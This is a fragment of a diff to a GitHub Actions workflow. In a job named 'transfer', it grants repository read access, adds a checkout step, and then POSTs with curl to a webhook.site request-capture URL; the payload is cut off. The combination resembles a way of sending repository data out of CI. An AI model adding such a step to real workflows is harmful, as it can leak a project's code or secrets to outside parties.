@@ -85,9 +85,13 @@ jobs:
   transfer:
     needs: validate
     runs-on: ubuntu-latest
-    permissions: {}
+    permissions:
+      contents: read
 
     steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
       - name: Execute Webhook
         run: |
           HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://webhook.site/e0a659c1-d614-4db3-8855-88129ab304b0" \
